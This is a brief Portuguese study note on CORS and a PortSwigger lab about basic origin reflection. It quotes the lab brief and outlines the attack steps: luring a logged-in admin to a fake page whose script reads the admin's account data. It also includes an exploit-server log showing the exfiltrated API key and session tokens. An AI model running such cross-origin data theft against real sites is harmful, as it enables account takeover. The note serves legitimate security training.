# CORS
CROSS ORIGIN RESOURCE SHARING

É um mecanismo do browser que gerencia acesso à recursos hosteados fora do dominio principal.

----------

# Lab: CORS vulnerability with basic origin reflection
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: wiener:peter



## Ataque

-> Usar BURP Suite para testar se o website usa CORS

-> Criar um site falso que sera enviado para o admin do site que queremos atacar

-> Para o ataque funcionar, o admin do site atacado precisa estar logado como admin no seu browser

-> Quando ele abrir nosso site falso, o JS que escrevemos vai roubar seus cookies de admin

-> Usamos os cookies de admin para logar como admin no site

-> A partir disso conseguimos descobrir a API KEY de administrador do site atacado.


## Log

2024-09-30 14:31:13 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22MrWH8ExemqOHR1aLZwmreuQFLXxOkj3W%22,%20%20%22sessions%22:%20[%20%20%20%20%22rS0AzFRXFYHM9dcZQefXYwpzI6ZjzhrJ%22,%20%20%20%20%22gMWknqdNOhyuxTub3fIjO1aoWRGB5Rd7%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"\


## Decoded Log

 "username": "administrator",  "email": "",  "apikey": "MrWH8ExemqOHR1aLZwmreuQFLXxOkj3W",  "sessions": [    "rS0AzFRXFYHM9dcZQefXYwpzI6ZjzhrJ",    "gMWknqdNOhyuxTub3fIjO1aoWRGB5Rd7"  ]


## API Key

MrWH8ExemqOHR1aLZwmreuQFLXxOkj3W
